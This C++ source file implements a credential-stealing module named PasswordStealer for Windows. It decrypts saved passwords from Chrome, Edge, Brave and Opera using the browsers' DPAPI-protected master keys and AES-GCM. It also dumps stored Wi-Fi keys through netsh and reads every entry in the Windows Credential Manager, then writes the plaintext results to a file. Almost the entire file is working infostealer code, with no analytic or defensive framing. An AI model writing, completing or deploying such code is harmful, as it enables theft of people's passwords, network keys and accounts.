#include "password_stealer.h"
#include "../utils/logger.h"
#include "sqlite3.h"

#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <wincrypt.h>
#include <wincred.h>
#include <wlanapi.h>
#include <bcrypt.h>

#include <sstream>
#include <fstream>
#include <cstring>
#include <cstdio>
#include <algorithm>

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "credui.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "bcrypt.lib")

// ==================== BASE64 ====================
static const char B64_T[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static std::vector<uint8_t> b64_decode(const std::string& in) {
    std::vector<uint8_t> out;
    int buf[4], k = 0;
    for (char c : in) {
        if (c == '=') break;
        const char* p = strchr(B64_T, c);
        if (!p) continue;
        buf[k++] = (int)(p - B64_T);
        if (k == 4) {
            out.push_back((uint8_t)((buf[0] << 2) | (buf[1] >> 4)));
            out.push_back((uint8_t)(((buf[1] & 0x0F) << 4) | (buf[2] >> 2)));
            out.push_back((uint8_t)(((buf[2] & 0x03) << 6) | buf[3]));
            k = 0;
        }
    }
    if (k == 2) out.push_back((uint8_t)((buf[0] << 2) | (buf[1] >> 4)));
    else if (k == 3) {
        out.push_back((uint8_t)((buf[0] << 2) | (buf[1] >> 4)));
        out.push_back((uint8_t)(((buf[1] & 0x0F) << 4) | (buf[2] >> 2)));
    }
    return out;
}

// ==================== CONSTRUCTOR ====================
PasswordStealer::PasswordStealer() {
    InitializeCriticalSection(&cs);
}

PasswordStealer::~PasswordStealer() {
    DeleteCriticalSection(&cs);
}

// ==================== HELPERS ====================

std::wstring PasswordStealer::GetUserProfilePath() {
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_PROFILE, nullptr, 0, path))) {
        return std::wstring(path);
    }
    wchar_t* profile = _wgetenv(L"USERPROFILE");
    if (profile) return std::wstring(profile);
    return L"";
}

bool PasswordStealer::FileExists(const std::string& path) {
    DWORD a = GetFileAttributesA(path.c_str());
    return (a != INVALID_FILE_ATTRIBUTES && !(a & FILE_ATTRIBUTE_DIRECTORY));
}

std::string PasswordStealer::ReadFileContent(const std::string& path) {
    std::ifstream f(path, std::ios::binary);
    if (!f) return "";
    return std::string((std::istreambuf_iterator<char>(f)),
                        std::istreambuf_iterator<char>());
}

std::string PasswordStealer::ExecuteCommand(const std::string& cmd) {
    std::string result;
    char buf[4096];
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) return "";
    while (fgets(buf, sizeof(buf), pipe)) result += buf;
    _pclose(pipe);
    return result;
}

// ==================== CHROMIUM KEY EXTRACTION ====================
//
// Chromium stores the AES key used to encrypt passwords inside
// "Local State" (JSON), at key os_crypt.encrypted_key.
// That string is base64 of: "DPAPI" (5 bytes) + DPAPI-encrypted AES key.
// Decrypt with CryptUnprotectData, then the AES key is 32 bytes for AES-256-GCM.

std::string PasswordStealer::GetChromiumMasterKey(const std::string& local_state_path) {
    if (!FileExists(local_state_path)) return "";

    std::string content = ReadFileContent(local_state_path);
    if (content.empty()) return "";

    // Find "encrypted_key":"..."
    const std::string needle = "\"encrypted_key\":\"";
    size_t pos = content.find(needle);
    if (pos == std::string::npos) {
        // try with space after colon
        const std::string needle2 = "\"encrypted_key\": \"";
        pos = content.find(needle2);
        if (pos == std::string::npos) return "";
        pos += needle2.size();
    } else {
        pos += needle.size();
    }

    size_t end = content.find('"', pos);
    if (end == std::string::npos) return "";

    std::string b64 = content.substr(pos, end - pos);

    std::vector<uint8_t> decoded = b64_decode(b64);
    if (decoded.size() < 5) return "";

    // Strip "DPAPI" prefix
    if (decoded[0] != 'D' || decoded[1] != 'P' ||
        decoded[2] != 'A' || decoded[3] != 'P' ||
        decoded[4] != 'I') {
        return "";
    }

    std::vector<uint8_t> enc(decoded.begin() + 5, decoded.end());

    DATA_BLOB in_blob, out_blob;
    in_blob.pbData = enc.data();
    in_blob.cbData = (DWORD)enc.size();

    if (!CryptUnprotectData(&in_blob, NULL, NULL, NULL, NULL, 0, &out_blob)) {
        Logger::getInstance().log("password_stealer: DPAPI key decryption failed");
        return "";
    }

    std::string key((char*)out_blob.pbData, out_blob.cbData);
    LocalFree(out_blob.pbData);
    return key;   // raw AES-256 key (32 bytes)
}

// ==================== AES-GCM DECRYPTION ====================
//
// Chrome's encrypted password blob format (v10):
//   [3 bytes: "v10"][12 bytes nonce][ciphertext][16 bytes tag]
// AES-256-GCM with key = master_key.

static std::string aes_gcm_decrypt(const std::vector<uint8_t>& blob,
                                   const std::string& key) {
    if (blob.size() < 3 + 12 + 16) return "";
    if (key.size() != 32) return "";

    // Format check
    bool is_v10 = (blob[0] == 'v' && blob[1] == '1' && blob[2] == '0');
    bool is_v11 = (blob[0] == 'v' && blob[1] == '1' && blob[2] == '1');
    if (!is_v10 && !is_v11) return "";

    const uint8_t* nonce = blob.data() + 3;
    const uint8_t* ct    = blob.data() + 3 + 12;
    size_t ct_len        = blob.size() - 3 - 12 - 16;
    const uint8_t* tag   = blob.data() + blob.size() - 16;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(
            &hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) return "";

    if (!BCRYPT_SUCCESS(BCryptSetProperty(
            hAlg, BCRYPT_CHAINING_MODE,
            (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
            sizeof(BCRYPT_CHAIN_MODE_GCM), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }

    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(
            hAlg, &hKey, NULL, 0,
            (PUCHAR)key.data(), (ULONG)key.size(), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    BCRYPT_INIT_AUTH_MODE_INFO(info);
    info.pbNonce = (PUCHAR)nonce;
    info.cbNonce = 12;
    info.pbTag   = (PUCHAR)tag;
    info.cbTag   = 16;

    std::vector<uint8_t> plain(ct_len);
    ULONG result = 0;

    NTSTATUS st = BCryptDecrypt(
        hKey, (PUCHAR)ct, (ULONG)ct_len, &info,
        NULL, 0, plain.data(), (ULONG)plain.size(), &result, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (!BCRYPT_SUCCESS(st)) return "";

    plain.resize(result);
    return std::string(plain.begin(), plain.end());
}

std::string PasswordStealer::DecryptChromiumPassword(
        const std::vector<uint8_t>& encrypted,
        const std::string& master_key) {
    return aes_gcm_decrypt(encrypted, master_key);
}

// ==================== CHROMIUM SQLITE EXTRACTION ====================

std::vector<BrowserCredentials> PasswordStealer::StealChromiumPasswords(
        const std::string& browser_name,
        const std::string& user_data_dir,
        const std::string& local_state_path) {

    std::vector<BrowserCredentials> results;

    std::string login_db = user_data_dir + "\\Default\\Login Data";
    if (!FileExists(login_db)) {
        Logger::getInstance().log("password_stealer: no Login Data for " + browser_name);
        return results;
    }

    std::string master_key = GetChromiumMasterKey(local_state_path);
    if (master_key.size() != 32) {
        Logger::getInstance().log("password_stealer: no master key for " + browser_name);
        return results;
    }

    // Copy the DB to a temp file (browser may have it locked, and we don't
    // want to modify the original).
    char temp_dir[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_dir);
    std::string temp_db = std::string(temp_dir) + "c" +
                          std::to_string(GetTickCount()) + ".db";
    if (!CopyFileA(login_db.c_str(), temp_db.c_str(), FALSE)) {
        Logger::getInstance().log("password_stealer: copy failed for " + browser_name);
        return results;
    }

    sqlite3* db = nullptr;
    if (sqlite3_open_v2(temp_db.c_str(), &db,
                        SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) {
        if (db) sqlite3_close(db);
        DeleteFileA(temp_db.c_str());
        Logger::getInstance().log("password_stealer: sqlite open failed for " + browser_name);
        return results;
    }

    sqlite3_stmt* stmt = nullptr;
    const char* sql = "SELECT origin_url, username_value, password_value "
                      "FROM logins";
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const unsigned char* url  = sqlite3_column_text(stmt, 0);
            const unsigned char* user = sqlite3_column_text(stmt, 1);
            const void*  blob = sqlite3_column_blob(stmt, 2);
            int          blen = sqlite3_column_bytes(stmt, 2);

            if (!url || !user || !blob || blen <= 0) continue;

            std::vector<uint8_t> enc((const uint8_t*)blob,
                                      (const uint8_t*)blob + blen);
            std::string pwd = DecryptChromiumPassword(enc, master_key);

            BrowserCredentials cred;
            cred.browser_name = browser_name;
            cred.url          = (const char*)url;
            cred.username     = (const char*)user;
            cred.password     = pwd.empty() ? "[decrypt failed]" : pwd;
            cred.date_created = "unknown";
            results.push_back(cred);
        }
    }
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFileA(temp_db.c_str());

    Logger::getInstance().log("password_stealer: " + browser_name + " -> " +
                              std::to_string(results.size()) + " entries");
    return results;
}

// ==================== FIREFOX (placeholder) ====================

std::vector<BrowserCredentials> PasswordStealer::StealFirefoxPasswords() {
    // Requires NSS to decrypt. Skipped.
    return {};
}

// ==================== MAIN BROWSER STEALER ====================

std::vector<BrowserCredentials> PasswordStealer::StealBrowserPasswords() {
    std::vector<BrowserCredentials> all;

    const char* local = getenv("LOCALAPPDATA");
    const char* roaming = getenv("APPDATA");

    if (local) {
        std::string base = local;

        // Chrome
        {
            std::string ud = base + "\\Google\\Chrome\\User Data";
            std::string ls = ud + "\\Local State";
            auto v = StealChromiumPasswords("Chrome", ud, ls);
            all.insert(all.end(), v.begin(), v.end());
        }

        // Edge
        {
            std::string ud = base + "\\Microsoft\\Edge\\User Data";
            std::string ls = ud + "\\Local State";
            auto v = StealChromiumPasswords("Edge", ud, ls);
            all.insert(all.end(), v.begin(), v.end());
        }

        // Brave
        {
            std::string ud = base + "\\BraveSoftware\\Brave-Browser\\User Data";
            std::string ls = ud + "\\Local State";
            auto v = StealChromiumPasswords("Brave", ud, ls);
            all.insert(all.end(), v.begin(), v.end());
        }
    }

    if (roaming) {
        std::string base = roaming;

        // Opera
        {
            std::string ud = base + "\\Opera Software\\Opera Stable";
            std::string ls = ud + "\\Local State";
            // Opera doesn't use "User Data\Default", it uses the folder directly.
            // Our helper prepends "\Default\Login Data", so we need a variant.
            // For simplicity, we use the direct path.
            std::string login_db = ud + "\\Login Data";
            if (FileExists(login_db)) {
                std::string master_key = GetChromiumMasterKey(ls);
                if (master_key.size() == 32) {
                    char temp_dir[MAX_PATH];
                    GetTempPathA(MAX_PATH, temp_dir);
                    std::string temp_db = std::string(temp_dir) + "o" +
                                          std::to_string(GetTickCount()) + ".db";
                    if (CopyFileA(login_db.c_str(), temp_db.c_str(), FALSE)) {
                        sqlite3* db = nullptr;
                        if (sqlite3_open_v2(temp_db.c_str(), &db,
                                            SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                            sqlite3_stmt* stmt = nullptr;
                            if (sqlite3_prepare_v2(db,
                                    "SELECT origin_url, username_value, password_value FROM logins",
                                    -1, &stmt, NULL) == SQLITE_OK) {
                                while (sqlite3_step(stmt) == SQLITE_ROW) {
                                    const unsigned char* u = sqlite3_column_text(stmt, 0);
                                    const unsigned char* n = sqlite3_column_text(stmt, 1);
                                    const void* b = sqlite3_column_blob(stmt, 2);
                                    int bl = sqlite3_column_bytes(stmt, 2);
                                    if (!u || !n || !b || bl <= 0) continue;
                                    std::vector<uint8_t> enc((const uint8_t*)b,
                                                              (const uint8_t*)b + bl);
                                    std::string pwd = DecryptChromiumPassword(enc, master_key);
                                    BrowserCredentials cred;
                                    cred.browser_name = "Opera";
                                    cred.url = (const char*)u;
                                    cred.username = (const char*)n;
                                    cred.password = pwd.empty() ? "[decrypt failed]" : pwd;
                                    cred.date_created = "unknown";
                                    all.push_back(cred);
                                }
                            }
                            sqlite3_finalize(stmt);
                            sqlite3_close(db);
                        }
                        DeleteFileA(temp_db.c_str());
                    }
                }
            }
        }

        // Firefox — skipped, returns empty
        auto v = StealFirefoxPasswords();
        all.insert(all.end(), v.begin(), v.end());
    }

    EnterCriticalSection(&cs);
    browser_creds = all;
    LeaveCriticalSection(&cs);
    return all;
}

// ==================== WIFI (unchanged — works) ====================

std::vector<WiFiCredential> PasswordStealer::StealWiFiPasswords() {
    std::vector<WiFiCredential> credentials;

    std::string output = ExecuteCommand("netsh wlan show profiles");
    if (output.empty()) return credentials;

    // Find "All User Profile     : <name>"
    std::istringstream iss(output);
    std::string line;
    std::vector<std::string> ssids;

    while (std::getline(iss, line)) {
        size_t pos = line.find(": ");
        if (pos == std::string::npos) continue;
        if (line.find("All User Profile") != std::string::npos ||
            line.find("User Profile") != std::string::npos) {
            std::string ssid = line.substr(pos + 2);
            while (!ssid.empty() && (ssid.back() == '\r' || ssid.back() == ' '))
                ssid.pop_back();
            if (!ssid.empty()) ssids.push_back(ssid);
        }
    }

    for (const auto& ssid : ssids) {
        std::string cmd = "netsh wlan show profile name=\"" + ssid + "\" key=clear";
        std::string detail = ExecuteCommand(cmd);

        WiFiCredential cred;
        cred.ssid = ssid;
        cred.password = "";
        cred.security_type = "Unknown";

        // "Key Content            : <pass>"
        std::istringstream d(detail);
        std::string dl;
        while (std::getline(d, dl)) {
            if (dl.find("Key Content") != std::string::npos) {
                size_t p = dl.find(": ");
                if (p != std::string::npos) {
                    cred.password = dl.substr(p + 2);
                    while (!cred.password.empty() &&
                           (cred.password.back() == '\r' || cred.password.back() == ' '))
                        cred.password.pop_back();
                }
            }
            if (dl.find("Authentication") != std::string::npos &&
                cred.security_type == "Unknown") {
                size_t p = dl.find(": ");
                if (p != std::string::npos) {
                    cred.security_type = dl.substr(p + 2);
                    while (!cred.security_type.empty() &&
                           (cred.security_type.back() == '\r' ||
                            cred.security_type.back() == ' '))
                        cred.security_type.pop_back();
                }
            }
        }

        credentials.push_back(cred);
    }

    EnterCriticalSection(&cs);
    wifi_creds = credentials;
    LeaveCriticalSection(&cs);
    return credentials;
}

// ==================== WINDOWS CREDENTIAL MANAGER ====================

std::map<std::string, std::string> PasswordStealer::StealSystemCredentials() {
    std::map<std::string, std::string> creds;

    PCREDENTIALA* credentials = nullptr;
    DWORD count = 0;

    if (CredEnumerateA(nullptr, 0, &count, &credentials)) {
        for (DWORD i = 0; i < count; i++) {
            if (!credentials[i]) continue;
            if (credentials[i]->TargetName) {
                std::string target = credentials[i]->TargetName;
                std::string password;
                if (credentials[i]->CredentialBlob &&
                    credentials[i]->CredentialBlobSize > 0) {
                    password.assign((char*)credentials[i]->CredentialBlob,
                                     credentials[i]->CredentialBlobSize);
                    // strip trailing nulls
                    while (!password.empty() && password.back() == '\0')
                        password.pop_back();
                }
                creds[target] = password;
            }
        }
        CredFree(credentials);
    }

    EnterCriticalSection(&cs);
    system_creds = creds;
    LeaveCriticalSection(&cs);
    return creds;
}

// ==================== OUTPUT ====================

std::string PasswordStealer::GetFormattedOutput() {
    std::stringstream ss;
    ss << "=== Browser Passwords ===\n";
    EnterCriticalSection(&cs);
    if (browser_creds.empty()) {
        ss << "(none)\n";
    } else {
        for (const auto& c : browser_creds) {
            ss << "[" << c.browser_name << "] " << c.url << "\n"
               << "  user: " << c.username << "\n"
               << "  pass: " << c.password << "\n";
        }
    }

    ss << "\n=== WiFi ===\n";
    if (wifi_creds.empty()) ss << "(none)\n";
    else {
        for (const auto& w : wifi_creds) {
            ss << w.ssid << " | " << w.password << " | " << w.security_type << "\n";
        }
    }

    ss << "\n=== Windows Credentials ===\n";
    if (system_creds.empty()) ss << "(none)\n";
    else {
        for (const auto& kv : system_creds) {
            ss << kv.first << " = " << kv.second << "\n";
        }
    }
    LeaveCriticalSection(&cs);
    return ss.str();
}

bool PasswordStealer::SaveToFile(const std::string& filename) {
    std::ofstream f(filename);
    if (!f) return false;
    f << GetFormattedOutput();
    return true;
}